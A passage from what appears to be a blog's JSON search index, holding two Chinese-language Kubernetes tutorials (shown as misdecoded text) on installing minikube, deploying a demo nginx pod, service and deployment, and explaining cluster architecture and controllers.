kubctlã€ä¸€ä¸ªå¯ä»¥åœ¨æœ¬åœ°è·‘èµ·æ¥çš„ Kubernetes ç¯å¢ƒ Minikubeã€‚\n\n### 1.1 å®‰è£… k8s\n\n```bash\ncat <<EOF > /etc/yum.repos.d/kubernetes.repo\n[kubernetes]\nname=Kubernetes\nbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64\nenabled=1\ngpgcheck=1\nrepo_gpgcheck=1\ngpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\nexclude=kube*\nEOF\n\n\n\nyum install -y kubelet kubeadm kubectl --disableexcludes=kubernetes\nsystemctl enable kubelet && systemctl start kubelet\n```\n\n\n\n### 1.2 å®‰è£… minikube\n\nminikube æ˜¯ä¸€ç§è½»é‡çº§çš„ Kubernetes å®ç°ï¼Œå¯åœ¨æœ¬åœ°è®¡ç®—æœºä¸Šåˆ›å»º VM å¹¶éƒ¨ç½²ä»…åŒ…å«ä¸€ä¸ªèŠ‚ç‚¹çš„ç®€å•é›†ç¾¤ã€‚ç®€å•ç†è§£ä¸ºä¸€ä¸ªè¿è¡Œåœ¨æœ¬åœ°Nodeï¼Œæˆ‘ä»¬å¯ä»¥åœ¨é‡Œé¢åˆ›å»ºPodsæ¥åˆ›å»ºå¯¹åº”çš„æœåŠ¡.\n\n```bash\ncurl -LO https://storage.googleapis.com/minikube/releases/latest/minikube-linux-amd64 \\\n   && sudo install minikube-linux-amd64 /usr/local/bin/minikube\n   \n   \nminikube start --vm-driver=none --image-repository=registry.cn-hangzhou.aliyuncs.com/google_containers\n```\n\n\n\nä¸ºä»€ä¹ˆå¢åŠ åé¢çš„image-repository, å› ä¸ºGFWæ€»æ˜¯ä¼šåœ¨æ— å½¢ä¸­å¢åŠ å­¦ä¹ çš„éš¾åº¦. è¯·å‚è€ƒ: https://github.com/kubernetes/minikube/issues/3860\n\nminikube å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨é…ç½® kubectlï¼ŒæŠŠå®ƒæŒ‡å‘ Minikube æä¾›çš„ Kubernetes API æœåŠ¡ã€‚å¯ä»¥ç”¨ä¸‹é¢çš„å‘½ä»¤ç¡®è®¤ï¼š\n\n```bash\n$ kubectl config current-context\nminikube\n```\n\n\n\n# 2. ä½¿ç”¨\n\nå…¸å‹çš„ Kubernetes é›†ç¾¤åŒ…å«ä¸€ä¸ª master å’Œå¤šä¸ª nodeã€‚æ¯ä¸ª node ä¸Šè¿è¡Œç€ç»´æŠ¤ node çŠ¶æ€å¹¶å’Œ master é€šä¿¡çš„ kubeletã€‚ä½œä¸ºä¸€ä¸ªå¼€å‘å’Œæµ‹è¯•çš„ç¯å¢ƒï¼ŒMinikube ä¼šå»ºç«‹ä¸€ä¸ªæœ‰ä¸€ä¸ª node çš„é›†ç¾¤ï¼Œç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥çœ‹åˆ°ï¼š\n\n```bash\n$ kubectl get nodes\nNAME       STATUS    AGE       VERSION\nminikube   Ready     1h        v1.10.0\n```\n\n\n\n### 2.1 åˆ›å»º docker å®¹å™¨\n\n```bash\nmkdir html\necho '<h1>Hello Kubernetes!</h1>' > html/index.html\n```\n\n`Dockerfile`\n\n```dockerfile\nFROM nginx\nCOPY html/* /usr/share/nginx/html\n```\n\nåˆ›å»º:\n\n```bash\ndocker build -t k8s-demo:0.1 .\n```\n\n\n\n### 2.2 åˆ›å»º pod\n\n`pod.yml`\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n    name: k8s-demo\n    labels:\n     app: k8s-demo\nspec:\n    containers:\n        - name: k8s-demo\n          image: k8s-demo:0.1\n          ports:\n              - containerPort: 80\n```\nåˆ›å»º:\n\n```bash\nkubectl create -f pod.yml\n \n\nkubectl get pods\n# NAME       READY     STATUS    RESTARTS   AGE\n# k8s-demo   1/1       Running   0          5s\n\n\n# ä¿®æ”¹ pod.yml, å¹¶åº”ç”¨\nkubectl apply -f pod.yml\n```\n\n\n\nè™½ç„¶è¿™ä¸ª pod åœ¨è¿è¡Œï¼Œæˆ‘ä»¬æ— æ³•ä»å¤–éƒ¨ç›´æ¥è®¿é—®ã€‚è¦æŠŠæœåŠ¡æš´éœ²å‡ºæ¥ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª Serviceã€‚\n\nService çš„ä½œç”¨æœ‰ç‚¹åƒå»ºç«‹äº†ä¸€ä¸ªåå‘ä»£ç†å’Œè´Ÿè½½å‡è¡¡å™¨ï¼Œè´Ÿè´£æŠŠè¯·æ±‚åˆ†å‘ç»™åé¢çš„ podã€‚\n\n### 2.3 åˆ›å»º service\n\n`svc.yaml`\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n    name: k8s-demo-svc\n    labels:\n        app: k8s-demo\nspec:\n    type: NodePort\n    ports:\n        - port: 80\n          nodePort: 30050\n    selector:\n        app: k8s-demo\n```\n\nè¿™ä¸ª service ä¼šæŠŠå®¹å™¨çš„ 80 ç«¯å£ä» node çš„ 30050 ç«¯å£æš´éœ²å‡ºæ¥ã€‚\n\næ³¨æ„æ–‡ä»¶æœ€åä¸¤è¡Œçš„ selector éƒ¨åˆ†ï¼Œè¿™é‡Œå†³å®šäº†è¯·æ±‚ä¼šè¢«å‘é€ç»™é›†ç¾¤é‡Œçš„å“ªäº› podã€‚è¿™é‡Œçš„å®šä¹‰æ˜¯æ‰€æœ‰åŒ…å«ã€Œapp: k8s-demoã€è¿™ä¸ªæ ‡ç­¾çš„ podã€‚\n\n\n\næŸ¥çœ‹æ ‡ç­¾å‘½ä»¤:\n\n```bash\nkubectl describe pods | grep Labels\n```\n\n\n\nåˆ›å»º:\n\n```bash\nkubectl create -f svc.yml\n```\n\n\n\nç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥å¾—åˆ°æš´éœ²å‡ºæ¥çš„ URLï¼Œåœ¨æµè§ˆå™¨é‡Œè®¿é—®ï¼Œå°±èƒ½çœ‹åˆ°æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„ç½‘é¡µäº†ã€‚\n\n```bash\nminikube service k8s-demo-svc --url\n# http://10.0.0.5:30050\n\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n### 2.4 åˆ›å»º deployment\n\nåœ¨æ­£å¼ç¯å¢ƒä¸­æˆ‘ä»¬éœ€è¦è®©ä¸€ä¸ªæœåŠ¡ä¸å—å•ä¸ªèŠ‚ç‚¹æ•…éšœçš„å½±å“ï¼Œå¹¶ä¸”è¿˜è¦æ ¹æ®è´Ÿè½½å˜åŒ–åŠ¨æ€è°ƒæ•´èŠ‚ç‚¹æ•°é‡ï¼Œæ‰€ä»¥ä¸å¯èƒ½åƒä¸Šé¢ä¸€æ ·é€ä¸ªç®¡ç† podã€‚\n\nKubernetes çš„ç”¨æˆ·é€šå¸¸æ˜¯ç”¨ Deployment æ¥ç®¡ç†æœåŠ¡çš„ã€‚ä¸€ä¸ª deployment å¯ä»¥åˆ›å»ºæŒ‡å®šæ•°é‡çš„ pod éƒ¨ç½²åˆ°å„ä¸ª node ä¸Šï¼Œå¹¶å¯å®Œæˆæ›´æ–°ã€å›æ»šç­‰æ“ä½œã€‚\n\n`deployment.yml`\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-demo-deployment\nspec:\n  replicas: 10\n  minReadySeconds: 10\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 1\n      maxSurge: 1\n  template:\n    metadata:\n      labels:\n        app: k8s-demo\n    spec:\n      containers:\n        - name: k8s-demo-pod\n          image: k8s-demo:0.1\n          ports:\n            - containerPort: 80\n  selector:\n    matchLabels:\n      app: k8s-demo\n```\n\nåˆ›å»º:\n\n```bash\nkubectl create -f deployment.yml\n\n# ç”¨ä¸‹é¢çš„å‘½ä»¤å¯ä»¥çœ‹åˆ°è¿™ä¸ª deployment çš„å‰¯æœ¬é›†ï¼ˆreplica setï¼‰ï¼Œæœ‰ 10 ä¸ª pod åœ¨è¿è¡Œã€‚\n\nkubectl get rs\n# NAME                             DESIRED   CURRENT   READY     AGE\n# k8s-demo-deployment-774878f86f   10        10        10        19s\n```\n\n\n\nå‡è®¾æˆ‘ä»¬å¯¹é¡¹ç›®åšäº†ä¸€äº›æ”¹åŠ¨ï¼Œè¦å‘å¸ƒä¸€ä¸ªæ–°ç‰ˆæœ¬ã€‚è¿™é‡Œä½œä¸ºç¤ºä¾‹ï¼Œæˆ‘ä»¬åªæŠŠ HTML æ–‡ä»¶çš„å†…å®¹æ”¹ä¸€ä¸‹, ç„¶åæ„å»ºä¸€ä¸ªæ–°ç‰ˆé•œåƒ k8s-demo:0.2ï¼š\n\n```bash\necho '<h1>Hello Kubernetes22222222222!</h1>' > html/index.html\ndocker build -t k8s-demo:0.2 .\n\n# æ›¿æ¢ deployment.yml çš„ tag å€¼\n\n# é‡æ–°åº”ç”¨ deployment\nkubectl apply -f deployment.yml --record=true\n```\n\n\n\næ­¤æ—¶æˆ‘ä»¬è®¿é—®\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes22222222222!\n```\n\n\n\nå›æ»šç‰ˆæœ¬1\n\n```Â bash\nkubectl rollout undo deployment k8s-demo-deployment --to-revision=1\n\n# å¯ä»¥æŸ¥çœ‹å›æ»šè¿›åº¦\nkubectl rollout status deployment k8s-demo-deployment\n```\n\n\n\nå†æ¬¡è®¿é—®\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n### 2.5 æ€»ç»“\n\nPod(å†…å«docker å®¹å™¨) ->  service æš´éœ² pod\n\ndeployment ç®¡ç†Podåˆ°nodeï¼Œå¹¶è¿›è¡Œç‰ˆæœ¬ç›¸å…³æ§åˆ¶ã€‚\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/39937913\n","tags":["k8s"],"categories":["k8s"]},{"title":"k8sçš„å…¥é—¨ä¸å®è·µ","url":"%2Fp%2F40c9599.html","content":"\nåœ¨å®¹å™¨ç¼–æ’é¢†åŸŸï¼Œæ¯”è¾ƒè‘—åçš„ä¸»è¦æœ‰ä¸‰ä¸ªï¼šKubernetes, Mesos, åŠ Docker è‡ªå®¶çš„ Swarmã€‚\n\n<!-- more -->\n\n# 1.  æ¶æ„\n\nKubernetesæ¶æ„å¯ç®€å•åˆ†ä¸ºä¸»ï¼ˆMasterï¼‰èŠ‚ç‚¹ã€ä»ï¼ˆå·¥ä½œ/Worker/Nodeï¼‰èŠ‚ç‚¹å’Œæ•°æ®åº“Etcdã€‚å…¶ä¸­ä¸»èŠ‚ç‚¹ä¸ºé›†ç¾¤çš„æ§åˆ¶å•å…ƒï¼Œä¸€èˆ¬ä¸ä¼šè¿è¡Œä¸šåŠ¡åº”ç”¨ç¨‹åºï¼Œä¸»è¦åŒ…å«çš„ç»„ä»¶æœ‰Kube-APIServerã€Kube-ControllerManagerã€Kube-Schedulerã€‚\n\nä»èŠ‚ç‚¹ä¸ºå·¥ä½œèŠ‚ç‚¹ï¼Œä¹Ÿå°±æ˜¯éƒ¨ç½²åº”ç”¨ç¨‹åºå®¹å™¨çš„èŠ‚ç‚¹ï¼Œä¸»è¦åŒ…å«çš„ç»„ä»¶æœ‰Kubeletã€Kube-Proxyï¼Œå½“ç„¶å¦‚æœMasterèŠ‚ç‚¹ä¹Ÿè¦éƒ¨ç½²å®¹å™¨ï¼Œä¹Ÿä¼šåŒ…å«è¿™ä¸¤ä¸ªç»„ä»¶ã€‚\n\n<img src=\"k8sçš„å…¥é—¨ä¸å®è·µ/image-20230911083822805.png\" alt=\"image-20230911083822805\" style=\"zoom:50%;\" />\n\nEtcdé›†ç¾¤å¯ä»¥å’ŒMasterèŠ‚ç‚¹éƒ¨ç½²åœ¨åŒä¸€ä¸ªå®¿ä¸»æœºï¼Œä¹Ÿå¯ä»¥å•ç‹¬éƒ¨ç½²ï¼Œç”Ÿäº§ç¯å¢ƒå»ºè®®éƒ¨ç½²å¤§äº3çš„å¥‡æ•°å°EtcdèŠ‚ç‚¹å®ç°Etcdé›†ç¾¤çš„é«˜å¯ç”¨ã€‚\n\n<img src=\"k8sçš„å…¥é—¨ä¸å®è·µ/1.jpeg\" alt=\"1\" style=\"zoom:40%;\" />\n\n### 1.1 MasterèŠ‚ç‚¹\n\nMasterèŠ‚ç‚¹æ˜¯Kubernetesé›†ç¾¤çš„æ§åˆ¶èŠ‚ç‚¹ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸å»ºè®®éƒ¨ç½²é›†ç¾¤æ ¸å¿ƒç»„ä»¶å¤–çš„ä»»ä½•å®¹å™¨ã€‚MasterèŠ‚ç‚¹æ˜¯Kubernetesé›†ç¾¤çš„æ§åˆ¶èŠ‚ç‚¹ï¼Œåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä¸å»ºè®®éƒ¨ç½²é›†ç¾¤æ ¸å¿ƒç»„ä»¶å¤–çš„ä»»ä½•å®¹å™¨ã€‚\n\n##### 1. API Server\n\næ•´ä¸ªé›†ç¾¤çš„æ§åˆ¶ä¸­æ¢ï¼Œæä¾›é›†ç¾¤ä¸­å„ä¸ªæ¨¡å—ä¹‹é—´çš„æ•°æ®äº¤æ¢ï¼Œå¹¶å°†é›†ç¾¤çŠ¶æ€å’Œä¿¡æ¯å­˜å‚¨åˆ°åˆ†å¸ƒå¼é”®-å€¼ï¼ˆkey-valueï¼‰å­˜å‚¨ç³»ç»ŸEtcdé›†ç¾¤ä¸­ã€‚åŒæ—¶ï¼Œå®ƒä¹Ÿæ˜¯é›†ç¾¤ç®¡ç†ã€èµ„æºé…é¢ã€æä¾›å®Œå¤‡çš„é›†ç¾¤å®‰å…¨æœºåˆ¶çš„å…¥å£ï¼Œä¸ºé›†ç¾¤å„ç±»èµ„æºå¯¹è±¡æä¾›å¢åˆ æ”¹æŸ¥ä»¥åŠwatchçš„REST APIæ¥å£ã€‚APIServerä½œä¸ºKubernetesçš„å…³é”®ç»„ä»¶ï¼Œä½¿ç”¨Kubernetes APIå’ŒJSON over HTTPæä¾›Kubernetesçš„å†…éƒ¨å’Œå¤–éƒ¨æ¥å£ã€‚\n\n##### 2. Scheduler\n\né›†ç¾¤Podçš„è°ƒåº¦ä¸­å¿ƒï¼Œä¸»è¦é€šè¿‡è°ƒåº¦ç®—æ³•å°†Podåˆ†é…åˆ°æœ€ä½³çš„NodeèŠ‚ç‚¹ï¼Œå®ƒé€šè¿‡APIServerç›‘å¬æ‰€æœ‰Podçš„çŠ¶æ€ï¼Œä¸€æ—¦å‘ç°æ–°çš„æœªè¢«è°ƒåº¦åˆ°ä»»ä½•NodeèŠ‚ç‚¹çš„Podï¼ˆPodSpec.NodeNameä¸ºç©ºï¼‰ï¼Œå°±ä¼šæ ¹æ®ä¸€ç³»åˆ—ç­–ç•¥é€‰æ‹©æœ€ä½³èŠ‚ç‚¹è¿›è¡Œè°ƒåº¦ï¼Œå¯¹æ¯ä¸€ä¸ªPodåˆ›å»ºä¸€ä¸ªç»‘å®šï¼ˆBindingï¼‰ï¼Œç„¶åè¢«è°ƒåº¦çš„èŠ‚ç‚¹ä¸Šçš„Kubeletè´Ÿè´£å¯åŠ¨è¯¥Podã€‚\n\n##### 3. Controller Manager\n\né›†ç¾¤çŠ¶æ€ç®¡ç†å™¨ï¼ˆå®ƒçš„è‹±æ–‡ç›´è¯‘åä¸ºæ§åˆ¶å™¨ç®¡ç†å™¨ï¼‰ï¼Œä»¥ä¿è¯Podæˆ–å…¶ä»–èµ„æºè¾¾åˆ°æœŸæœ›å€¼ã€‚å½“é›†ç¾¤ä¸­æŸä¸ªPodçš„å‰¯æœ¬æ•°æˆ–å…¶ä»–èµ„æºå› æ•…éšœå’Œé”™è¯¯å¯¼è‡´æ— æ³•æ­£å¸¸è¿è¡Œï¼Œæ²¡æœ‰è¾¾åˆ°è®¾å®šçš„å€¼æ—¶ï¼ŒController Managerä¼šå°è¯•è‡ªåŠ¨ä¿®å¤å¹¶ä½¿å…¶è¾¾åˆ°æœŸæœ›çŠ¶æ€ã€‚\n\n##### 4. Cluster state store\n\nå­˜å‚¨é›†ç¾¤æ‰€æœ‰éœ€æŒä¹…åŒ–çš„çŠ¶æ€ï¼Œå¹¶ä¸”æä¾› watch çš„åŠŸèƒ½æ”¯æŒï¼Œå¯ä»¥å¿«é€Ÿçš„é€šçŸ¥å„ç»„ä»¶çš„å˜æ›´ç­‰æ“ä½œã€‚\n\nå› ä¸ºç›®å‰ Kubernetes çš„å­˜å‚¨å±‚é€‰æ‹©æ˜¯ etcd ï¼Œæ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œå¤§å®¶éƒ½ç›´æ¥ä»¥ etcd æ¥ä»£è¡¨é›†ç¾¤çŠ¶æ€å­˜å‚¨æœåŠ¡ã€‚å³ï¼šå°†æ‰€æœ‰çŠ¶æ€å­˜å‚¨åˆ° etcd å®ä¾‹ä¸­ã€‚Master ç›¸å½“äºæ˜¯ K8S é›†ç¾¤çš„å¤§è„‘ï¼Œæ›´ç»†åŒ–æ¥çœ‹ï¼Œetcd åˆ™æ˜¯å¤§è„‘ä¸­çš„æ ¸å¿ƒã€‚\n\n### 1.2 Node èŠ‚ç‚¹\n\nNodeèŠ‚ç‚¹ä¹Ÿè¢«ç§°ä¸ºWorkerã€Nodeå’ŒMinionï¼Œæ˜¯ä¸»è¦è´Ÿè´£éƒ¨ç½²å®¹å™¨ï¼ˆå·¥ä½œè´Ÿè½½ï¼‰çš„å•æœºï¼ˆæˆ–è™šæ‹Ÿæœºï¼‰ï¼Œé›†ç¾¤ä¸­çš„æ¯ä¸ªèŠ‚ç‚¹éƒ½å¿…é¡»å…·å¤‡å®¹å™¨çš„Runtimeï¼ˆè¿è¡Œæ—¶ï¼‰ï¼Œæ¯”å¦‚Dockeræˆ–å…¶ä»–éµå¾ªCRIæ ‡å‡†çš„Runtimeç­‰ã€‚\n\nKubeletä½œä¸ºå®ˆæŠ¤è¿›ç¨‹è¿è¡Œåœ¨NodeèŠ‚ç‚¹ä¸Šï¼Œè´Ÿè´£ç›‘å¬è¯¥èŠ‚ç‚¹ä¸Šæ‰€æœ‰çš„Podï¼ŒåŒæ—¶è´Ÿè´£ä¸ŠæŠ¥è¯¥èŠ‚ç‚¹ä¸Šæ‰€æœ‰Podçš„è¿è¡ŒçŠ¶æ€ï¼Œç¡®ä¿èŠ‚ç‚¹ä¸Šçš„æ‰€æœ‰å®¹å™¨éƒ½èƒ½æ­£å¸¸è¿è¡Œã€‚å½“NodeèŠ‚ç‚¹å®•æœºæˆ–æ•…éšœï¼ˆNotReadyçŠ¶æ€ï¼‰æ—¶ï¼Œè¯¥èŠ‚ç‚¹ä¸Šè¿è¡Œçš„Podä¼šè¢«è‡ªåŠ¨è½¬ç§»åˆ°å…¶ä»–èŠ‚ç‚¹ä¸Šã€‚\n\n##### 1. Kubelet\n\nè´Ÿè´£ä¸Masteré€šä¿¡åä½œï¼Œç®¡ç†è¯¥èŠ‚ç‚¹ä¸Šçš„Podï¼Œå¯¹å®¹å™¨è¿›è¡Œå¥åº·æ£€æŸ¥åŠç›‘æ§ï¼ŒåŒæ—¶è´Ÿè´£ä¸ŠæŠ¥èŠ‚ç‚¹å’ŒèŠ‚ç‚¹ä¸Šé¢Podçš„çŠ¶æ€ã€‚\n\n##### 2. Kube Proxy\n\næˆ‘ä»¬éƒ½çŸ¥é“ï¼Œæƒ³è¦è®¿é—®æŸä¸ªæœåŠ¡ï¼Œé‚£è¦ä¹ˆé€šè¿‡åŸŸåï¼Œè¦ä¹ˆé€šè¿‡ IPã€‚è€Œæ¯ä¸ª Pod åœ¨åˆ›å»ºåéƒ½ä¼šæœ‰ä¸€ä¸ªè™šæ‹Ÿ IPï¼ŒK8S ä¸­æœ‰ä¸€ä¸ªæŠ½è±¡çš„æ¦‚å¿µï¼Œå«åš `Service` ï¼Œ`kube-proxy` ä¾¿æ˜¯æä¾›ä¸€ç§ä»£ç†çš„æœåŠ¡ï¼Œè®©ä½ å¯ä»¥é€šè¿‡ `Service` è®¿é—®åˆ° Podã€‚\n\nå®é™…çš„å·¥ä½œåŸç†æ˜¯åœ¨æ¯ä¸ª Node ä¸Šå¯åŠ¨ä¸€ä¸ª `kube-proxy` çš„è¿›ç¨‹ï¼Œé€šè¿‡ç¼–æ’ `iptables` è§„åˆ™æ¥è¾¾åˆ°æ­¤æ•ˆæœã€‚\n\n##### 3. Container runtime\n\nå®¹å™¨è¿è¡Œæ—¶æœ€ä¸»è¦çš„åŠŸèƒ½æ˜¯ä¸‹è½½é•œåƒå’Œè¿è¡Œå®¹å™¨ï¼Œæˆ‘ä»¬æœ€å¸¸è§çš„å®ç°å¯èƒ½æ˜¯ Docker , ç›®å‰è¿˜æœ‰å…¶ä»–çš„ä¸€äº›å®ç°ï¼Œæ¯”å¦‚ rkt, cri-oã€‚\n\nK8S æä¾›äº†ä¸€å¥—é€šç”¨çš„å®¹å™¨è¿è¡Œæ—¶æ¥å£ CRI (Container Runtime Interface), å‡¡æ˜¯ç¬¦åˆè¿™å¥—æ ‡å‡†çš„å®¹å™¨è¿è¡Œæ—¶å®ç°ï¼Œå‡å¯åœ¨ K8S ä¸Šä½¿ç”¨ã€‚\n\n\n\n### 1.3 å…¶ä»–ç»„ä»¶\n\n##### 1. CoreDNS\n\nç”¨äºKubernetesé›†ç¾¤å†…éƒ¨Serviceçš„è§£æï¼Œå¯ä»¥è®©PodæŠŠServiceåç§°è§£ææˆServiceçš„IPï¼Œç„¶åé€šè¿‡Serviceçš„IPåœ°å€è¿æ¥åˆ°å¯¹åº”çš„åº”ç”¨ä¸Šã€‚\n\n##### 2. Calico\n\nç¬¦åˆCNIæ ‡å‡†çš„ä¸€ä¸ªç½‘ç»œæ’ä»¶ï¼Œå®ƒè´Ÿè´£ç»™æ¯ä¸ªPodåˆ†é…ä¸€ä¸ªä¸ä¼šé‡å¤çš„IPï¼Œå¹¶ä¸”æŠŠæ¯ä¸ªèŠ‚ç‚¹å½“ä½œä¸€ä¸ªâ€œè·¯ç”±å™¨â€ï¼Œè¿™æ ·ä¸€ä¸ªèŠ‚ç‚¹çš„Podå°±å¯ä»¥é€šè¿‡IPåœ°å€è®¿é—®å…¶ä»–èŠ‚ç‚¹çš„Podã€‚\n\n\n\n### 1.4 Podçš„æ¦‚å¿µ\n\nä¸ºä»€ä¹ˆKubernetesä¸ç›´æ¥ç®¡ç†å®¹å™¨è¿˜è¦è®¾è®¡ä¸€ä¸ªPodå‘¢ï¼Ÿæ¥ä¸‹æ¥æˆ‘ä»¬å¸¦ç€è¿™ä¸ªé—®é¢˜å­¦ä¹ Kubernetesæœ€å°çš„å•å…ƒâ€”â€”Podã€‚\n\nåœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œå•ä¸ªå®¹å™¨æ˜¯æ— æ³•å•ç‹¬æ¥æ”¯æ’‘æˆ‘ä»¬çš„åº”ç”¨ï¼Œå¾€å¾€éœ€è¦å¾ˆå¤šå¾®æœåŠ¡æ‰èƒ½ç»„æˆä¸€ä¸ªç³»ç»Ÿï¼Œå¹¶ä¸”è¿˜ä¼šå­˜åœ¨AæœåŠ¡ä¾èµ–BæœåŠ¡ï¼ŒBæœåŠ¡éœ€è¦å’ŒCæœåŠ¡å…±ç”¨æŸä¸ªç›®å½•ï¼Œå®ç°æ•°æ®å…±äº«ã€‚\n\nDockeråªæ˜¯å®¹å™¨Runtimeï¼ˆè¿è¡Œæ—¶ï¼‰ä¸­çš„ä¸€ç§ï¼Œå¸‚é¢ä¸Šè¿˜æœ‰å¾ˆå¤šå®¹å™¨çš„Runtimeï¼Œæ¯”å¦‚Rktã€CRI-Oç­‰ï¼Œè€ŒKubernetesä½œä¸ºç›®å‰æœ€æµè¡Œçš„å®¹å™¨ç¼–æ’å·¥å…·ï¼Œéœ€è¦æ”¯æŒå„ä¸ªRuntimeå¹¶ä¸”ä¸ä¾èµ–äºåº•å±‚Runtimeçš„å®ç°æŠ€æœ¯ï¼Œäºæ˜¯å°±æŠ½è±¡äº†Podè¿™ä¸ªæ¦‚å¿µï¼Œç”¨äºç®¡ç†å¤šä¸ªç´§å¯†ç›¸è¿çš„ç¬¦åˆCRIæ ‡å‡†çš„å®¹å™¨ã€‚\n\n<img src=\"k8sçš„å…¥é—¨ä¸å®è·µ/image-20230911085337138.png\" alt=\"image-20230911085337138\" style=\"zoom:80%;\" />\n\nPodå¯ç®€å•åœ°ç†è§£ä¸ºä¸€ç»„ã€ä¸€ä¸ªæˆ–å¤šä¸ªå®¹å™¨ï¼Œæ¯ä¸ªPodè¿˜åŒ…å«ä¸€ä¸ªPauseå®¹å™¨ï¼ŒPauseå®¹å™¨æ˜¯Podçš„çˆ¶å®¹å™¨ï¼Œå®ƒä¸»è¦è´Ÿè´£åƒµå°¸è¿›ç¨‹çš„å›æ”¶ç®¡ç†ï¼ŒåŒæ—¶é€šè¿‡Pauseå®¹å™¨å¯ä»¥ä½¿åŒä¸€ä¸ªPodé‡Œé¢çš„ä¸åŒå®¹å™¨å…±äº«å­˜å‚¨ã€ç½‘ç»œã€PIDã€IPCç­‰ï¼Œå®¹å™¨ä¹‹é—´å¯ä»¥ä½¿ç”¨localhost:portç›¸äº’è®¿é—®ï¼Œå¯ä»¥ä½¿ç”¨Volumeç­‰å®ç°æ•°æ®å…±äº«ã€‚\n\n##### 1. åˆ›å»ºä¸€ä¸ªpod\n\nåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œå¾ˆå°‘å•ç‹¬è¿è¡Œä¸€ä¸ªPodï¼Œå› ä¸ºå•ç‹¬åˆ›å»ºçš„Podå¹¶ä¸èƒ½å®ç°ä¸€äº›é«˜çº§çš„å‘å¸ƒç­–ç•¥ï¼Œæ‰€ä»¥åœ¨å®é™…ä½¿ç”¨ä¸­ç»å¸¸ä¼šç”¨Deploymentã€DaemonSetã€StatefulSet ç­‰é«˜çº§æ§åˆ¶å™¨è°ƒåº¦å¹¶ç®¡ç†Podã€‚\n\n<img src=\"k8sçš„å…¥é—¨ä¸å®è·µ/CB_3300028184_Figure-P97_132954.jpg\" alt=\"img\" style=\"zoom:100%;\" />\n\n<img src=\"k8sçš„å…¥é—¨ä¸å®è·µ/CB_3300028184_Figure-P98_132955.jpg\" alt=\"img\" style=\"zoom:100%;\" />\t\n\n```bash\nkubectl create -f pod.yaml\n\n# pod/nginx created\n```\n\n\n\n# 2. è°ƒåº¦åŸºç¡€\n\n### 2.1 RC å’Œ RS\n\nReplication Controller(å¤åˆ¶æ§åˆ¶å™¨ï¼ŒRC)å’ŒReplicaSet(å¤åˆ¶é›†ï¼ŒRS)æ˜¯ä¸¤ç§ç®€å•éƒ¨ç½²Podçš„æ–¹å¼ã€‚ç›®å‰å¾ˆå°‘å•ç‹¬è¢«ä½¿ç”¨ï¼Œéƒ½æ˜¯ä½¿ç”¨æ›´é«˜çº§çš„èµ„æºDeploymentã€DaemonSetã€StatefulSetç®¡ç†Podã€‚\n\n##### Replication Controller\n\nReplication Controllerå¯ä»¥ç¡®ä¿Podå‰¯æœ¬æ•°è¾¾åˆ°æœŸæœ›å€¼ï¼Œä¹Ÿå°±æ˜¯RCå®šä¹‰çš„æ•°é‡ã€‚Replication Controllerç±»ä¼¼äºè¿›ç¨‹ç®¡ç†ç¨‹åºï¼Œä½†æ˜¯Replication Controllerä¸æ˜¯ç›‘è§†å•ä¸ªèŠ‚ç‚¹ä¸Šçš„å„ä¸ªè¿›ç¨‹ï¼Œè€Œæ˜¯ç›‘è§†å¤šä¸ªèŠ‚ç‚¹ä¸Šçš„å¤šä¸ªPodã€‚\n\n##### ReplicaSet\n\nå’ŒReplication Controllerå”¯ä¸€çš„åŒºåˆ«æ˜¯ï¼ŒReplicaSetæ”¯æŒæ ‡ç­¾é€‰æ‹©å™¨ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè™½ç„¶ReplicaSetå¯ä»¥å•ç‹¬ä½¿ç”¨ï¼Œä½†æ˜¯ä¸€èˆ¬å»ºè®®ä½¿ç”¨Deploymentæ¥è‡ªåŠ¨ç®¡ç†ReplicaSetã€‚\n\n### 2.2 æ— çŠ¶æ€åº”ç”¨ç®¡ç†Deployment\n\nDeploymentæ˜¯ä¸€ä¸ªæ›´é«˜çº§çš„æ¦‚å¿µï¼Œå®ƒç®¡ç†ReplicaSet å¹¶ä¸ºPodå’ŒReplicaSet æä¾›å£°æ˜æ€§æ›´æ–°ä»¥åŠè®¸å¤šå…¶ä»–æœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ‰€ä»¥å»ºè®®åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹ä½¿ç”¨Deploymentä»£æ›¿ ReplicaSetã€‚\n\n##### 1. åˆ›å»º\n\n<img src=\"k8sçš„å…¥é—¨ä¸å®è·µ/image-20230911091444810.png\" alt=\"image-20230911091444810\" style=\"zoom:50%;\" />\n\nç¤ºä¾‹è§£æï¼š\n\n+ nginx-deploymentï¼šDeploymentçš„åç§°ã€‚\n+ replicasï¼šåˆ›å»ºPodçš„å‰¯æœ¬æ•°ã€‚\n+ selectorï¼šå®šä¹‰Deploymentå¦‚ä½•æ‰¾åˆ°è¦ç®¡ç†çš„Podï¼Œä¸templateçš„labelï¼ˆæ ‡ç­¾ï¼‰å¯¹åº”ï¼ŒapiVersionä¸ºapps/v1å¿…é¡»æŒ‡å®šè¯¥å­—æ®µã€‚\n+ templateå­—æ®µåŒ…å«ä»¥ä¸‹å­—æ®µï¼š\n  + app: nginx 